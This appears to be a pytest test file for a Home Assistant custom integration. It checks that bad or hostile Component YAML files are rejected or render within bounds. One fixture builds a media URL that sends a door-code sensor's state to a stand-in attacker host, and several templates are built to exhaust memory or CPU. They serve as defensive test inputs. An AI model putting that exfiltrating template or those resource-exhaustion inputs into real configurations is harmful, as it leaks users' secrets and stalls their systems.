"""Tests that one bad Component file never breaks the whole library."""

import time
from unittest.mock import patch

import pytest
from homeassistant.config_entries import ConfigEntryState
from homeassistant.core import HomeAssistant
from homeassistant.exceptions import TemplateError
from pytest_homeassistant_custom_component.common import MockConfigEntry

from custom_components.apollo_tab.library import Library
from custom_components.apollo_tab.sandbox import ComponentTemplate, RenderLimitError

from .conftest import WriteComponent, setup_integration

SIMPLE_COMPONENT = """\
id: me/simple
version: 1.0.0
name: Simple
size: 1x1
params:
  entity: {domain: light}
inputs:
  state: "{{ states(entity) }}"
outputs:
  toggle:
    action: light.toggle
    data: {entity_id: "{{ entity }}"}
    feedback: optimistic
layout:
  - type: switch
    value: state
    on_tap: toggle
"""

RADIO_COMPONENT = """\
id: community/radio
version: 1.0.0
name: Radio
size: 1x1
params:
  entity: {domain: media_player}
inputs:
  state: "{{ states(entity) }}"
outputs:
  play:
    action: media_player.play_media
    data:
      entity_id: "{{ entity }}"
      media_content_type: music
      media_content_id:
        "http://attacker.invalid/a.mp3?c={{ states('sensor.door_code') }}"
    feedback: optimistic
layout:
  - type: button
    text: Play
    on_tap: play
"""

DATE_COMPONENT = SIMPLE_COMPONENT.replace("me/simple", "me/date") + "when: 2001-13-45\n"


def _with_id(component_id: str, template: str | None = None) -> str:
    """Return the simple Component under another id, optionally with another input."""
    text = SIMPLE_COMPONENT.replace("me/simple", component_id)
    if template is not None:
        text = text.replace("{{ states(entity) }}", template)
    return text


def _parens(depth: int) -> str:
    """Return a template with the given number of nested parentheses."""
    return "{{ " + "(" * depth + "1" + ")" * depth + " }}"


BAD_FILES = [
    ("b-date.yaml", DATE_COMPONENT, "yaml_error"),
    ("b-deep.yaml", "[" * 20000, "yaml_error"),
    ("b-deep-closed.yaml", "a: " + "[" * 3000 + "]" * 3000 + "\n", "yaml_error"),
    ("b-int.yaml", "a: " + "9" * 5000 + "\n", "yaml_error"),
    ("b-parens.yaml", _with_id("me/parens", _parens(150)), "bad_template"),
    ("b-parens-deep.yaml", _with_id("me/parens-deep", _parens(480)), "bad_template"),
    (
        "b-regex.yaml",
        _with_id("me/regex", "{{ states(entity) | regex_replace('a', 'b') }}"),
        "bad_template",
    ),
    (
        "b-macro.yaml",
        _with_id("me/macro", "{% macro m() %}{% endmacro %}{{ m() }}"),
        "bad_template",
    ),
    (
        "b-type.yaml",
        _with_id("me/type").replace("- type: switch", "- type: [switch]"),
        None,
    ),
]


@pytest.mark.parametrize(("file_name", "text", "code"), BAD_FILES)
async def test_bad_file_does_not_break_library(
    hass: HomeAssistant,
    user_components: WriteComponent,
    file_name: str,
    text: str,
    code: str | None,
) -> None:
    """Load the good file and list one error for the bad file."""
    user_components("a-good.yaml", SIMPLE_COMPONENT)
    user_components(file_name, text)
    library = Library(hass)
    start = time.perf_counter()
    await library.async_load()
    assert time.perf_counter() - start < 5
    assert "me/simple" in library.components
    assert len(library.errors) == 1
    assert library.errors[0]["file"] == file_name
    if code is not None:
        assert library.errors[0]["code"] == code


# These load; their cost is bounded while they render (see sandbox.py).
COSTLY_TEMPLATES = [
    "{{ 9**9999 }}",
    "{{ 9**9999999 }}",
    "{{ 'a'*300000000 }}",
    "{{ ('%9' ~ '99999999d') % 1 }}",
    "{{ 'x' | center(30000 * 30000) }}",
]


@pytest.mark.parametrize("template", COSTLY_TEMPLATES)
async def test_costly_template_loads_fast_and_fails_when_rendered(
    hass: HomeAssistant, user_components: WriteComponent, template: str
) -> None:
    """Load a Component with a costly template fast; rendering it fails fast."""
    user_components("b-costly.yaml", _with_id("me/costly", template))
    library = Library(hass)
    start = time.perf_counter()
    await library.async_load()
    assert time.perf_counter() - start < 2
    assert "me/costly" in library.components
    assert library.errors == []
    start = time.perf_counter()
    with pytest.raises(TemplateError) as excinfo:
        ComponentTemplate(template, hass).async_render(parse_result=False)
    assert time.perf_counter() - start < 1
    assert isinstance(excinfo.value.__cause__, RenderLimitError)


async def test_entry_sets_up_with_bad_file(
    hass: HomeAssistant,
    config_entry: MockConfigEntry,
    user_components: WriteComponent,
) -> None:
    """A bad user file does not stop the config entry from loading."""
    user_components("a-good.yaml", SIMPLE_COMPONENT)
    user_components("b-date.yaml", DATE_COMPONENT)
    await hass.config_entries.async_setup(config_entry.entry_id)
    await hass.async_block_till_done()
    assert config_entry.state is ConfigEntryState.LOADED
    assert "me/simple" in config_entry.runtime_data.library.components


async def test_reload_over_websocket_reports_error(
    hass: HomeAssistant,
    config_entry: MockConfigEntry,
    user_components: WriteComponent,
    hass_ws_client,
) -> None:
    """List the bad file when the library reloads over the websocket."""
    user_components("a-good.yaml", SIMPLE_COMPONENT)
    await setup_integration(hass, config_entry)
    user_components("b-date.yaml", DATE_COMPONENT)
    client = await hass_ws_client(hass)
    await client.send_json_auto_id({"type": "apollo_tab/library/reload"})
    response = await client.receive_json()
    assert response["success"]
    assert response["result"]["errors"] == 1


async def test_failed_reload_keeps_previous_library(
    hass: HomeAssistant, user_components: WriteComponent
) -> None:
    """Keep the previous library when loading raises unexpectedly."""
    user_components("a-good.yaml", SIMPLE_COMPONENT)
    library = Library(hass)
    await library.async_load()
    components = library.components
    errors = library.errors
    calls: list[str] = []
    library.async_listen(lambda: calls.append("called"))
    with patch.object(Library, "_load_files", side_effect=RuntimeError("boom")):
        await library.async_load()
    assert library.components is components
    assert library.errors is errors
    assert "me/simple" in library.components
    assert not calls


async def test_data_template_cannot_read_other_entities(
    hass: HomeAssistant, user_components: WriteComponent
) -> None:
    """Refuse a Component whose service data reads another entity's state."""
    user_components("radio.yaml", RADIO_COMPONENT)
    library = Library(hass)
    await library.async_load()
    assert "community/radio" not in library.components
    assert len(library.errors) == 1
    assert library.errors[0]["file"] == "radio.yaml"
    assert library.errors[0]["code"] == "bad_template"
